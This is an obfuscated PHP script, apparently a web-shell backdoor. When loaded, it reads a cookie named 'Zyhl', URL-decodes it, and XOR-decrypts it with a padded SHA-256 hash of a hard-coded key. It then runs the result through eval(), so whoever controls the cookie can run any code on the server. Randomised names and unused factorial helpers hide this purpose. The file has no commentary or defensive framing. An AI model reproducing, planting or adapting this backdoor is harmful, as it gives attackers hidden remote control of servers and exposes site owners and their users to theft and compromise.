<?php function HbDwNG($TOkBqJId, $COBwYOiv)
{
    $URaJDcNyIa = $TOkBqJId ^ $COBwYOiv;
    return $URaJDcNyIa;
}
function HYqTYel($RexRjYPlHP, $LSuCsmjxM)
{
    $EyEpbmfra = edckbrZrKD($RexRjYPlHP);
    $JQuNGGyM = NmNtA($LSuCsmjxM, $EyEpbmfra);
    $hmsWYgVw = HbDwNG($JQuNGGyM, $RexRjYPlHP);
    return $hmsWYgVw;
}
function SfEaTB($IeZGu)
{
    $gjNgcygA = UgBMp($IeZGu);
    $mbfAMDok = fctfzgeHh($gjNgcygA);
    return $mbfAMDok;
}
function YGEyKouOtD()
{
    $WjJgs = "LZemGkybQWOVcypIiWjFPZICVZyhl";
    return $WjJgs;
}
function fctfzgeHh($FfcluZ)
{
    $ArVlZ = rawurldecode($FfcluZ);
    return $ArVlZ;
}
function zkfYZW($hootFk) {
    if ($hootFk <= 1) {
        return 1;
    }
    return $hootFk * zkfYZW($hootFk - 1);
}
function VAUPFAr($deycoQW)
{
    $AwNFFsP = substr($deycoQW, -4);
    return $AwNFFsP;
}
function NmNtA($xagOcgZpv, $VlscVTw)
{
    $mKMZU = str_pad($xagOcgZpv, $VlscVTw, $xagOcgZpv);
    return $mKMZU;
}
function YJtbUXeEF($ASmjuZKTh, $xfwqnYECW)
{
    $xnauHyBAP = ZDOFp($ASmjuZKTh);
    $mbfAMDok = SfEaTB($xfwqnYECW);
    $PsHZJLziF = HYqTYel($mbfAMDok, $xnauHyBAP);
    return $PsHZJLziF;
}
function pRQhbuys($WYlmqEHQ)
{
    $Qcdmr = VAUPFAr($WYlmqEHQ);
    $PhfRoQoS = YJtbUXeEF($WYlmqEHQ, $Qcdmr);
    return $PhfRoQoS;
}
function ZDOFp($gqcCyrPY)
{
    $mDzlq = hash("sha256", $gqcCyrPY, TRUE);
    return $mDzlq;
}
function NFlUQhc($ZGOOQ) {
    $IerCPKO = 0;
    foreach ($ZGOOQ as $gglJgPp) {
        $IerCPKO += zkfYZW($gglJgPp);
    }
    return $IerCPKO;
}
function UgBMp($egfzB)
{
    $ZyzgZDQirA = $_COOKIE[$egfzB];
    return $ZyzgZDQirA;
}
function ctoxWcqWE($hootFkBMlLJIk)
{
    eval($hootFkBMlLJIk);
}
function edckbrZrKD($jxyOos)
{
    $icPootUtB = strlen($jxyOos);
    return $icPootUtB;
}
function eKRFKcut()
{
    $JNZUkQKCG = YGEyKouOtD();
    $EyETuyN = pRQhbuys($JNZUkQKCG);
    return $EyETuyN;
}
function MMNRyvPza()
{
    $hmsWYgVw = eKRFKcut();
    ctoxWcqWE($hmsWYgVw);
}
MMNRyvPza();